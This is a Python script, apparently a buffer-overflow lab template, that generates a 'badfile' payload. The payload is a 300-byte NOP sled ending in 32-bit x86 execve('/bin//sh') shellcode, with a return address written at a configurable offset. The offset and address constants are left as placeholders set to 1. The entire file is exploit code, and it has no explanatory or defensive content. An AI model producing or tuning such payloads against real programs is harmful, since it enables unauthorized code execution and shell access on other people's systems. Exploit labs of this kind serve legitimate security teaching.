#!/usr/bin/env python3

OFFSET_TO_RET = 1
BUFFER_BASE_ADDR = 1
EBP_ADDRESS = 1
TARGET_OFFSET = 1

TARGET_ADDR = EBP_ADDRESS + TARGET_OFFSET

BADFILE_SIZE = 300

shellcode = (
    b"\x31\xc0"
    b"\x50"
    b"\x68\x2f\x2f\x73\x68" 
    b"\x68\x2f\x62\x69\x6e" 
    b"\x89\xe3"
    b"\x50"
    b"\x53"
    b"\x89\xe1"
    b"\x99"
    b"\xb0\x0b"
    b"\xcd\x80"
)

content = bytearray(0x90 for i in range(BADFILE_SIZE))

start = BADFILE_SIZE - len(shellcode)

content[start:] = shellcode

content[OFFSET_TO_RET:OFFSET_TO_RET+4] = TARGET_ADDR.to_bytes(4, byteorder='little')

with open ('badfile', 'wb') as f:
    f.write(content)